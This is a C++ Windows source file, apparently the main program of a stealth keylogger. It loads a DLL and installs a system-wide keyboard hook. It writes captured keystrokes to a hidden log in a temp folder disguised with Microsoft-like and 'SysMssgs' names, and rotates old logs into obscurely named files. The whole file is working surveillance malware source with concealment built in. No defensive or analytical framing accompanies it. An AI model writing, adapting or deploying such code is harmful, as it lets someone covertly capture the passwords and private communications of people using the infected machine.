#include "SysMssgs.h"

int WINAPI WinMain (HINSTANCE hThisInstance, HINSTANCE hPrevInstance, LPSTR lpszArgument, int nFunsterStil)

{
    MSG messages;
    char c, logfile[512], newstored[512], timebuffer[64], title[64], lfeed[4096], name[32], finalname[32], check[4096], *tok;
    struct HEADER head;
    fstream log;
    FILE * headp;
    time_t rawtime;
    struct tm * timeinfo;
    
    //attach library
    HINSTANCE hDll = LoadLibrary("SysMssgsLib.dll");
    if(hDll == NULL) exit(1);
    //get handle for keyboard function
    HOOKPROC KeyboardProc = reinterpret_cast<HOOKPROC>(GetProcAddress(hDll, "KeyboardProc"));
    if(KeyboardProc == NULL) exit(1);
  
    //create log files name
    GetTempPath(512, logfile);
    strcat(logfile, "Microsoft_9021784367548932\\Temp\\SysMssgs.db");
    
    //initialize log file
    log.open(logfile, fstream::in);
    if (log)
    {
            GetTempPath(512, newstored);
            strcat(newstored, "Microsoft_9021784367548932\\LG\\lib.db");
            
            ofstream newfile(newstored);
            log.seekg(sizeof(struct HEADER)+32, ios::beg);
            do
            {
                                    log.getline(lfeed, 4096);
                                    strcpy(check, lfeed);
                                    check[30] = '\0';
            }
            while (strcmp(check, " %%%%%%%%%%%%%%%%%%%%%%%%%%%%%") != 0);
            newfile << endl << lfeed << endl;
            log.getline(lfeed, 4096);
            newfile << lfeed << endl;
            log.getline(lfeed, 4096);
            newfile << lfeed << endl;
            tok = strtok(lfeed, ",");
            tok = strtok(NULL, ",%");
            strcpy(name, tok+1);
            strcpy(name+(strlen(name)-1), ".txt");
            log.getline(lfeed, 4096);
            newfile << lfeed << endl;
            log.getline(lfeed, 4096);
            newfile << lfeed << endl;
            while (!log.eof())
            {
                  log.get(c);
                  newfile << c;
            }
            finalname[0] = name[6];
            finalname[1] = name[7];
            finalname[2] = name[3];
            finalname[3] = name[4];
            finalname[4] = name[0];
            finalname[5] = name[1];
            finalname[6] = name[12];
            finalname[7] = name[13];
            finalname[8] = name[15];
            finalname[9] = name[16];
            strcpy(finalname + 10, ".db");
            newfile.close();
            newfile.clear();
            log.close();
            char dest[2048];
            GetTempPath(2048, dest);
            strcat(dest, "Microsoft_9021784367548932\\LG\\");
            strcat(dest, finalname);
            MoveFile(newstored, dest);
            SetFileAttributes(logfile, FILE_ATTRIBUTE_NORMAL); 
    }
    log.clear();
    log.open(logfile, fstream::out | fstream::trunc);
    SetFileAttributes(logfile, FILE_ATTRIBUTE_HIDDEN);   
    if (!log) exit(1);
    headp = fopen(logfile, "r+b");
    if (headp == NULL) exit(1);
    
    head.index = 1;
    head.addi = true;
    head.addl = false;
    strcpy(head.title, "Initial_Title_330");
    fwrite(&head, sizeof(struct HEADER), 1, headp);
    fclose(headp);
    time(&rawtime);
    timeinfo = localtime(&rawtime);
    log.seekp(sizeof(struct HEADER)+32, ios::beg);
    strftime(timebuffer, 50, "%A, %d/%m/%y at %H:%M", timeinfo);
    strcpy(title, " %  Starting log on ");
    strcat(title, timebuffer);
    strcat(title, "  \%");
    int len = strlen(title);
    log << endl << endl << endl << endl << endl << " ";
    for (int i = 1 ; i <= (len - 1) ; i ++) log << "\%";
    log << endl << " \%";
    for (int i = 1 ; i <= (len - 3) ; i ++) log << " ";
    log << "\%\n" << title << endl << " \%";
    for (int i = 1 ; i <= (len - 3) ; i ++) log << " ";
    log << "\%\n ";
    for (int i = 1 ; i <= (len - 1) ; i ++) log << "\%";
    log << endl << endl;
    log.close();
    
    //set keyboard hook    
    HHOOK hook = SetWindowsHookEx(WH_KEYBOARD, KeyboardProc, hDll, 0);
    if(hook == NULL) exit(1);

    //message loop
    while (GetMessage (&messages, NULL, 0, 0))
    {
        TranslateMessage(&messages);
        DispatchMessage(&messages);
    }
    return messages.wParam;
}

